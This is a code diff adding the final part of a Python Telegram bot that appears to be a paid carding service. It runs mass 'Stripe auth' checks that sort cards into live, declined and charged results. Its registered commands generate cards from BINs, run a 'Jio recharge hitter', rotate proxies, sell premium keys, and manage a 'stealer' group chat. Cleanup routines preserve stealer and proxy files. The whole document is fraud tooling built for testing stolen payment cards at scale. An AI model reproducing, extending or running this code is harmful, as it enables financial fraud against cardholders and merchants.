+                       len(all_results['tds']) + len(all_results['live']) +
+                       len(all_results['declined']) + len(all_results['error']))
+            now = time.time()
+            if now - last_update[0] >= 3:
+                last_update[0] = now
+                try:
+                    await update_mass_progress(user_id, progress_msg_id, all_results, checked, result)
+                except Exception:
+                    pass
+
+    try:
+        workers = [asyncio.create_task(worker()) for _ in range(STRIPE_WORKERS)]
+        await asyncio.gather(*workers, return_exceptions=True)
+    except Exception as _e:
+        print(f"[STRIPE MASS] {_e}")
+    finally:
+        _was_stopped = _stop_flags.get(session_key, False)
+        _stop_flags.pop(session_key, None)
+        active_sessions.pop(session_key, None)
+        user_active_check.pop(user_id, None)
+        if not _was_stopped:
+            try:
+                await send_final_results(user_id, all_results)
+            except Exception as _fe:
+                print(f"stripe send_final_results error: {_fe}")
+
+
+
+def _register_commands():
+    user_cmds = [
+        {"command": "start", "description": "🚀 Open dashboard"},
+        {"command": "sh", "description": "⚡ Single check"},
+        {"command": "msh", "description": "🔥 Mass check"},
+        {"command": "plans", "description": "⭐ View plans"},
+        {"command": "myplan", "description": "💎 Check your plan"},
+        {"command": "redeem", "description": "🔑 Redeem key"},
+        {"command": "setproxy", "description": "🔌 Set proxy"},
+        {"command": "clearuserproxy", "description": "🗑️ Clear proxy"},
+        {"command": "chkproxy", "description": "✅ Test proxy"},
+        {"command": "genbin", "description": "🎴 Generate cards"},
+        {"command": "bin", "description": "🔍 BIN lookup"},
+        {"command": "split", "description": "📂 Split file"},
+        {"command": "jio", "description": "📱 Jio recharge hitter"},
+        {"command": "stripe", "description": "💳 Stripe auth check"},
+        {"command": "mstripe", "description": "💳 Stripe mass check"}
+            ]
+    admin_cmds = user_cmds + [
+        {"command": "admin", "description": "👑 Admin panel"},
+        {"command": "addadmin", "description": "➕ Add admin"},
+        {"command": "rmadmin", "description": "❌ Remove admin"},
+        {"command": "setstealer", "description": "🕵️ Set stealer GC"},
+        {"command": "stealerinfo", "description": "🕵️ Stealer GC info"},
+        {"command": "pool", "description": "🎛️ Pool ON/OFF"},
+        {"command": "rmsteal", "description": "🚫 Block user from stealer"},
+        {"command": "unsteal", "description": "✅ Unblock user"},
+        {"command": "mysites", "description": "🌐 My sites"},
+        {"command": "setmysites", "description": "🌐 Set sites"},
+        {"command": "clearmysites", "description": "🌐 Clear sites"},
+        {"command": "grant", "description": "✅ Grant access"},
+        {"command": "auth", "description": "🔐 Auth access"},
+        {"command": "revoke", "description": "❌ Revoke access"},
+        {"command": "addpremium", "description": "➕ Add premium"},
+        {"command": "rmpremium", "description": "➖ Remove premium"},
+        {"command": "ban", "description": "🚫 Ban user"},
+        {"command": "unban", "description": "✅ Unban user"},
+        {"command": "users", "description": "📋 List users"},
+        {"command": "stats", "description": "📈 Bot stats"},
+        {"command": "genkey", "description": "🔑 Generate keys"},
+        {"command": "keys", "description": "🔑 View keys"},
+        {"command": "clearallkeys", "description": "🗑️ Clear keys"},
+        {"command": "addsite", "description": "🌐 Add site"},
+        {"command": "rmsite", "description": "❌ Remove site"},
+        {"command": "sites", "description": "📋 List sites"},
+        {"command": "checksites", "description": "🔍 Check sites"},
+        {"command": "addproxy", "description": "📡 Add proxy"},
+        {"command": "rmproxy", "description": "❌ Remove proxy"},
+        {"command": "proxies", "description": "📋 List proxies"},
+        {"command": "checkproxies", "description": "🔍 Check proxies"},
+        {"command": "clearproxy", "description": "🧹 Clear pool"},
+        {"command": "getproxy", "description": "📥 Get pool file"},
+        {"command": "setlog", "description": "📢 Set log group"},
+        {"command": "checklog", "description": "📢 Check log group"},
+        {"command": "filtersite", "description": "🔍 Filter sites by max price"},
+        {"command": "setlimit", "description": "⚙️ Set limit"},
+        {"command": "setworkers", "description": "🔧 Set workers"},
+        {"command": "broadcast", "description": "📢 Broadcast"},
+        {"command": "restart", "description": "🔄 Restart bot"}
+    ]
+    from keyboards import _http_session
+    base = f"https://api.telegram.org/bot{BOT_TOKEN}"
+    try:
+        _http_session.post(f"{base}/setMyCommands", json={"commands": user_cmds}, timeout=5)
+        _http_session.post(f"{base}/setMyCommands",
+                           json={"commands": admin_cmds, "scope": {"type": "chat", "chat_id": OWNER_ID}},
+                           timeout=5)
+    except:
+        pass
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STARTUP CLEANUP — delete old uploads + temp files
+# ══════════════════════════════════════════════════════════════════════════════
+def _startup_cleanup():
+    import shutil, glob as _g
+    cleaned = 0
+
+    # 1. Delete /tmp/rxo_uploads/* older than 1 hour
+    tmp_upload_dir = os.path.join(__import__('tempfile').gettempdir(), "rxo_uploads")
+    if os.path.isdir(tmp_upload_dir):
+        now = time.time()
+        for fpath in _g.glob(os.path.join(tmp_upload_dir, "*")):
+            try:
+                if now - os.path.getmtime(fpath) > 3600:
+                    os.remove(fpath)
+                    cleaned += 1
+            except Exception:
+                pass
+
+    # 2. Delete old .txt files in bot dir (except important ones)
+    KEEP_FILES = {
+        'sites.txt', 'proxy.txt', 'premium.txt', 'banned.txt',
+        'gifs.txt', 'welcome.txt', 'log_group.txt', 'keys.txt',
+        'videos.txt', 'stealer_gc.txt', 'redis_pass.txt',
+    }
+    for fpath in _g.glob(os.path.join(os.path.dirname(os.path.abspath(__file__)), "*.txt")):
+        fname = os.path.basename(fpath)
+        if fname in KEEP_FILES:
+            continue
+        try:
+            if os.path.getsize(fpath) > 0:
+                os.remove(fpath)
+                cleaned += 1
+        except Exception:
+            pass
+
+    # 3. Delete old generated/split files
+    for pattern in ("gen_*.txt", "split_*.txt", "charged.txt", "live.txt",
+                    "approved.txt", "3ds.txt", "declined.txt", "error.txt",
+                    "proxies_*.txt", "*.session-journal", "*.session-wal", "*.session-shm"):
+        for fpath in _g.glob(os.path.join(os.path.dirname(os.path.abspath(__file__)), pattern)):
+            try:
+                os.remove(fpath)
+                cleaned += 1
+            except Exception:
+                pass
+
+    # 4. Delete old backup files (keep last 3 of each)
+    import re as _re
+    _bak_patterns = ["bot.py.bak.*", "bot.py.safe.*", "config.py.bak.*", "storage.py.bak.*",
+                     "bot.py.bak.*", "check_engine.py.bak.*", "non_api.py.bak.*", "emojis.py.bak.*"]
+    for pat in _bak_patterns:
+        files = sorted(_g.glob(os.path.join(os.path.dirname(os.path.abspath(__file__)), pat)),
+                       key=os.path.getmtime, reverse=True)
+        for old_file in files[3:]:
+            try:
+                os.remove(old_file)
+                cleaned += 1
+            except Exception:
+                pass
+
+    print(f"[STARTUP-CLEANUP] Removed {cleaned} stale files")
+
+try:
+    _startup_cleanup()
+except Exception as _e:
+    print(f"[STARTUP-CLEANUP] error: {_e}")
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ BACKGROUND CLEANUP — every hour
+# ══════════════════════════════════════════════════════════════════════════════
+async def _background_cleanup():
+    while True:
+        await asyncio.sleep(3600)  # every hour
+        try:
+            _startup_cleanup()
+        except Exception as e:
+            print(f"[BG-CLEANUP] error: {e}")
+
+asyncio.get_event_loop().create_task(_background_cleanup()) if False else None
+
+_register_commands()
+_bin_count = load_bins()
+print(f"✅ {BOT_NAME} started successfully! (BIN DB: {_bin_count:,} entries)")
+bot.run_until_disconnected()
